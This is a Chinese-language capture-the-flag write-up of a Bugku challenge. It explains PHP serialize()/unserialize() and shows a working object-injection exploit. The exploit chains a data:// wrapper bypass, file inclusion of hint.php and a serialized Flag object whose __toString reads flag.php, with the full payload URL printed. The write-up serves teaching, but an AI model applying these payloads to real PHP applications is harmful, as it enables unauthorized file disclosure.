---
这应该是php序列化和反序列话需要用到的函数serialize()与unserialize()
---

# 关于php serialize\(\)与unserialize\(\)

## 0x00 问题来源

来源于 bugku ctf ：[http://120.24.86.145:8006/test1/](http://120.24.86.145:8006/test1/)

通过伪协议可以绕过 `file_get_contents($user,'r')==="welcome to the bugkuctf"`

通过同样伪协议+base64可以得到hint.php和index.php的源码

> hit.php

```text
<?php  
  
class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
			echo "<br>";
		return ("good");
        }  
    }  
}  
?>  
```

> index.php

```text
<?php  
$txt = $_GET["txt"];  
$file = $_GET["file"];  
$password = $_GET["password"];  
  
if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){  
    echo "hello friend!<br>";  
    if(preg_match("/flag/",$file)){ 
		echo "不能现在就给你flag哦";
        exit();  
    }else{  
        include($file);   
        $password = unserialize($password);  
        echo $password;  
    }  
}else{  
    echo "you are not the number of bugku ! ";  
}  
  
?>  
  
<!--  
$user = $_GET["txt"];  
$file = $_GET["file"];  
$pass = $_GET["password"];  
  
if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
    echo "hello admin!<br>";  
    include($file); //hint.php  
}else{  
    echo "you are not admin ! ";  
}  
 -->  
```

得到解题思路：用index中的12行包含hint.php,再利用Flag类读取flag.php，然后查一下：

unserialize\(\)是一个有关于php序列化的函数，会把已经序列化的php类转化成对象 

还有一个serialize\(\)是和unserialize\(\)相反的，这就好办了,直接利用下面的脚本得到序列化后的序列

```text
<?php
        class Flag{//flag.php
         public $file='flag.php';
         public function __tostring(){
                if(isset($this->file)){
                        echo file_get_contents($this->file);
                        echo "<br>";
                        return ("good");
                        }
                 }
        }
        $pass = new Flag();
        echo serialize($pass);
//      以下为测试内容
//      $pass = 'O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}';
//      $pass = unserialize($pass);
//      echo $pass;
?>
```

payload：view-source:[http://120.24.86.145:8006/test1/?txt=data:text/plain,welcome to the bugkuctf&file=hint.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}](http://120.24.86.145:8006/test1/?txt=data:text/plain,welcome%20to%20the%20bugkuctf&file=hint.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";})

## 0x01 总结

突然就写完了，本来还想详细总结一下这个函数，但是发现其实这个函数好像没什么总结的

serialize\(\)序列话对象后的格式其实是可以理解的 ，就是双引号括起来的内容前面的数字基本都是双引号中的内容的长度，再前面是类型，int型的话就是类型+内容，比如int类型的12，就是i:12，然后顺序是变量名；变量内容；下一个变量名；下一个变量内容
